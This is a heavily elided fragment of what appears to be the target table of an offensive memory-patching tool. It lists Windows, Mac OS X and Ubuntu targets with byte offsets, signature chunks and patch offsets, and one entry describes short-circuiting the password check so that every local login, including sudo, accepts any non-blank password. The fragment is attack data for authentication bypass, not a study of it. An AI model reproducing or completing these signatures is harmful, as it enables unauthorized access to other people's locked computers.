...
targets=[{'OS': 'Windows 7',
         ...
         {'OS': 'Windows XP',
          ...
          'signatures': [{'offsets': [0x862, 0x8aa, 0x946, 0x126, 0x9b6],
                          'chunks': [{'chunk': 0x83f8107511b0018b,
                                      ...
                                      'patchoffset': 0x00}]}]},
         {'OS': 'Mac OS X',
          'versions': ['10.6.4', '10.7'],
          'architectures': ['x64'],
          'name': 'DirectoryService / OpenDirectory technique',
          'notes': 'Short circuits the password validation function. After running, all local authentications (e.g., GUI, sudo, etc.) will work with all non-blank password',
         ...
         {'OS': 'Ubuntu',
          ...
          'signatures': [{'offsets': [0xebd, 0xbaf],
